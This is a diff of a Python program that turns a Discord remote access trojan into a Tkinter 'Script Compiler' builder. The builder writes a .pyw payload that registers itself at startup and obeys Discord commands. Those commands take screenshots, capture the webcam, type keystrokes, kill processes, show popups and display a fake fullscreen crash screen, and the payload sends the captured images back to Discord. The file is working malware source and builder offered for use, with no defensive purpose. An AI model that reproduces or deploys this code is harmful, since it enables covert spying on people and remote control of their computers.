@@ -1,4 +1,25 @@
+import tkinter as tk
+from tkinter import filedialog
+import os
+import shutil
 import discord
+from threading import Thread
+import pyautogui
+import time
+import platform
+import psutil
+import cv2
+from PIL import ImageGrab
+import win32gui
+import win32process
+
+def compile_script():
+    bot_token = entry.get()
+    if not bot_token:
+        result_label.config(text="Please enter a bot token.", fg="red")
+        return
+
+    script = f'''import discord
 import os
 import shutil
 import tkinter as tk
@@ -23,7 +44,7 @@ pc_name = os.getenv('COMPUTERNAME')
 if not pc_name:
     pc_name = "UnknownPC"
 
-category_name = f"--- {pc_name} ---"
+category_name = f"--- {{pc_name}} ---"
 
 black_window = None
 
@@ -34,7 +55,7 @@ def create_black_window():
 
     screen_width = black_window.winfo_screenwidth()
     screen_height = black_window.winfo_screenheight()
-    black_window.geometry(f"{screen_width}x{screen_height}+0+0")
+    black_window.geometry(f"{{screen_width}}x{{screen_height}}+0+0")
     black_window.attributes('-topmost', True)
     black_window.attributes('-fullscreen', True)
     black_window.attributes('-toolwindow', True)
@@ -55,7 +76,7 @@ def create_black_window():
     canvas.create_text(
         screen_width / 2,
         screen_height / 6 + 100,
-        text="Re Calculating PC, Please wait. ", 
+        text="Re Calculating PC, Please wait.", 
         font=("Arial", 15), 
         fill="white",
         anchor="n",
@@ -82,7 +103,7 @@ def close_black_window():
     if black_window and black_window.winfo_exists():
         black_window.withdraw()
 
-Photon = 'TOKEN'
+Photon = '{bot_token}'
 
 @client.event
 async def on_ready():
@@ -99,7 +120,7 @@ async def create_category_and_channels():
     if not category:
         category = await guild.create_category(category_name)
     
-    existing_channels = {channel.name for channel in guild.channels}
+    existing_channels = {{channel.name for channel in guild.channels}}
     channel_names = ['screenshots', 'webcam', 'implode', 'bsod', 'type', 'apps', 'clode']
     for channel_name in channel_names:
         if channel_name not in existing_channels:
@@ -155,7 +176,7 @@ async def on_message(message):
                     await message.channel.send('Screenshot taken and saved:', file=screenshot_file)
                 os.remove(screenshot_path)
             except Exception as e:
-                await message.channel.send(f'Error: {e}')
+                await message.channel.send(f'Error: {{e}}')
         elif message.content == '.webcam':
             try:
                 cap = cv2.VideoCapture(0)
@@ -174,7 +195,7 @@ async def on_message(message):
                 else:
                     await message.channel.send('Error: Failed to capture image from webcam.')
             except Exception as e:
-                await message.channel.send(f'Error: {e}')
+                await message.channel.send(f'Error: {{e}}')
         elif message.content == '.bsod':
             show_black_window()
             await message.channel.send('Bsod.')
@@ -192,27 +213,27 @@ async def on_message(message):
                 await message.channel.send('Imploded. The bot will now close.')
                 await client.close()
             except Exception as e:
-                await message.channel.send(f'Error: {e}')
+                await message.channel.send(f'Error: {{e}}')
         elif message.content.startswith('.type '):
             text_to_type = message.content[6:]
             if text_to_type:
                 pyautogui.write(text_to_type, interval=0.1)
                 pyautogui.press('enter')
-                await message.channel.send(f'Typed: {text_to_type}')
+                await message.channel.send(f'Typed: {{text_to_type}}')
             else:
                 await message.channel.send('Error: No text provided to type.')
         elif message.content == '.apps':
             try:
                 apps = await get_visible_apps()
                 if apps:
-                    app_list = '\n'.join(apps)
+                    app_list = '\\n'.join(apps)
                     if len(app_list) > 2000:
-                        app_list = app_list[:2000] + "\n...and more."
-                    await message.channel.send(f"Visible Apps:\n{app_list}")
+                        app_list = app_list[:2000] + "\\n...and more."
+                    await message.channel.send(f"Visible Apps:\\n{{app_list}}")
                 else:
                     await message.channel.send("No visible apps found.")
             except Exception as e:
-                await message.channel.send(f'Error: {e}')
+                await message.channel.send(f'Error: {{e}}')
         elif message.content.startswith('.close '):
             exe_name = message.content[7:].strip()
             if exe_name:
@@ -221,22 +242,22 @@ async def on_message(message):
                     try:
                         if proc.info['name'].lower() == exe_name.lower():
                             proc.terminate()
-                            await message.channel.send(f"{exe_name} has been closed.")
+                            await message.channel.send(f"{{exe_name}} has been closed.")
                             found = True
                             break
                     except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
-                        await message.channel.send(f'Error: {e}')
+                        await message.channel.send(f'Error: {{e}}')
                 if not found:
-                    await message.channel.send(f"No process found with name: {exe_name}")
+                    await message.channel.send(f"No process found with name: {{exe_name}}")
             else:
                 await message.channel.send("Please specify the name of the executable to close.")
         elif message.content.startswith('.popup '):
             popup_message = message.content[7:].strip()
             if popup_message:
                 show_popup(popup_message)
-                await message.channel.send(f'Popup created with message: {popup_message}')
+                await message.channel.send(f'Popup created with message: {{popup_message}}')
             else:
-                await message.channel.send("Error: No message provided for popup. durrr")
+                await message.channel.send("Error: No message provided for popup.")
     else:
         await message.channel.send('Commands can only be used in the designated channels.')
 
@@ -250,4 +271,34 @@ def add_to_startup():
 
 add_to_startup()
 
-client.run(Photon)
+client.run(Photon)'''
+
+    # Save the script in the same directory as the original script
+    original_script_path = os.path.abspath(__file__)
+    directory = os.path.dirname(original_script_path)
+    save_path = os.path.join(directory, 'compiled_script.pyw')
+
+    with open(save_path, 'w') as file:
+        file.write(script)
+
+    result_label.config(text=f"File compiled and saved successfully at: {save_path}", fg="green")
+
+root = tk.Tk()
+root.title("Script Compiler")
+
+# Apply a modern theme
+root.configure(bg="#2e2e2e")
+
+# Entry widget
+entry = tk.Entry(root, width=50, font=("Arial", 12), bd=2, relief=tk.GROOVE)
+entry.pack(pady=10)
+
+# Compile button
+compile_button = tk.Button(root, text="Compile Script", command=compile_script, font=("Arial", 12), bg="#4caf50", fg="white", bd=0, padx=10, pady=5)
+compile_button.pack(pady=10)
+
+# Result label
+result_label = tk.Label(root, text="", font=("Arial", 12), bg="#2e2e2e", fg="white")
+result_label.pack(pady=10)
+
+root.mainloop()
